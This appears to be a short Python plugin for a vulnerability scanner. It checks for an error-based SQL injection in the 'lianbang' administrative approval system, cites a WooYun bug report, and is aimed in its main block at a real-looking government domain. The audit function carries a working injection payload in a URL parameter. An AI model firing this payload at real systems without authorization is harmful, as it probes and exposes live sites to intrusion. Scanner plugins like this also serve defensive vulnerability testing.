#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:lianbang_SP system SQL injection
#author: POX
#ref: http://www.wooyun.org/bugs/wooyun-2010-0122708



def assign(service, arg):
    if service == "lianbangsoft":
        return True, arg


def audit(arg):
    payload = "workplate/xzsp/gxxt/tjfx/sxlist.aspx?baseorg=convert(int,%27tes%27%2b%27tvul%27)"
    url = arg + payload
    code, head,res, errcode, _url = curl.curl2(url)
    if code==500 and 'testvul' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lianbangsoft', 'http://www.rzfwzx.gov.cn/')[1])